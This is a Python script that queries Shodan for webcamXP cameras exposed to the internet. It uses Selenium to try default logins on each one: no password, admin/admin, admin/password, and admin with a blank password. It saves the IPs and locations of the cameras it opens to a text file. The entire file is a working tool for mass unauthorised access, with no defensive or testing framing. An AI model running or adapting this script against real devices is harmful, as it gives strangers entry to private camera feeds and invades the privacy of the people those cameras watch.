from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from shodan_engine import ShodanEngine
import sys

#  Setting up the chrome driver.
chrome_path = "D:\\Projects\\WebDriver\\chromedriver.exe"
driver = webdriver.Chrome(executable_path=chrome_path)

#  Unique API key for shodan.
#  Query to be searched.

API_KEY = str(sys.argv[1])
query = 'product:"webcamXP httpd"'

# We will check webcams of 4 categories
#  1. cams without any password or user
#  2. cams with user=admin and pass=admin
#  3. cams with user=admin and pass=(blank)
#  4. cams with user=admin and pass=password

# To check keys if the login is successful
def check_keys(username, password, username_box, password_box, login_box):
    current_url = driver.current_url 
    username_box.send_keys(username)
    password_box.send_keys(password)
    login_box.submit()

    WebDriverWait(driver, 15).until(EC.url_changes(current_url))
    
    # If webcam viewer is present then return true else return false
    if(driver.find_elements_by_class_name("webcam")):
        return True
    else:
        return False

# Same as above function but its just for the one without password
# Compiler was having issues with method overloading
# so I gave a different name instead of overloading 
def check_user_key(username,username_box,login_box):
    current_url = driver.current_url
    username_box.send_keys(username)
    login_box.submit()
    
    WebDriverWait(driver, 15).until(EC.url_changes(current_url))
    
    if(driver.find_elements_by_class_name("webcam")):
        return True
    else:
        return False

# To determining the category of login credentials
def determine_type(link):
    driver.get(link)
    if(driver.find_elements_by_class_name("webcam")):
        return "no pass"
    elif(driver.find_elements_by_name("username")):
        user_box = driver.find_element_by_name("username")
        pass_box = driver.find_element_by_name("password")
        login_box = driver.find_element_by_xpath("//input[@type='submit' and @value='Login']")

        try:
            if(check_keys("admin","admin",user_box,pass_box,login_box)):
                return "admin admin"
            elif(check_keys("admin","password",user_box,pass_box,login_box)):
                return "admin password"
            elif(check_user_key("admin",user_box,login_box)):
                return "admin blank"
            else:
                return ""
        except Exception as e:
            print("Error: {}".format(e))

#  Getting shodan ready to be used.
#  For more details see shodan_engine module.
obj = ShodanEngine(API_KEY, query)
ip_list = obj.get_list_with_port()
location_list = obj.get_location_list()

#  Maintaining dictonary of lists for different types of cams
res_dict = {}
no_pass = []
admin_admin = []
admin_blank = []
admin_password = []

#  Maintaining counter for location list
i = -1

#  Testing the ips present in the list
for ip in ip_list:
    i += 1
    link = "http://"+ip
    category = determine_type(link)
    location = location_list[i]
    sentence = "[+] {}\t|{}\t|type: {}".format(ip,location,category)
    
    if(category == "no pass"):
        print(sentence)
        no_pass.append(ip+"\t"+location)
        res_dict[category] = no_pass

    elif(category == "admin admin"):
        print(sentence)
        admin_admin.append(ip+"\t"+location)
        res_dict[category] = admin_admin

    elif(category == "admin blank"):
        print(sentence)
        admin_blank.append(ip+"\t"+location)
        res_dict[category] = admin_blank
    
    elif(category == "admin password"):
        print(sentence)
        admin_password.append(ip+"\t"+location)
        res_dict[category] = admin_password
    else:
        continue
    
driver.quit()

with open("webcams.txt","w") as f:
    for typ, li in res_dict.items():
        f.write(typ.upper()+"\n")
        f.write("\n")
        f.write("\n")
        for item in li:
            f.write(item+"\n")
        f.write("\n")
        f.write("\n")

f.close()

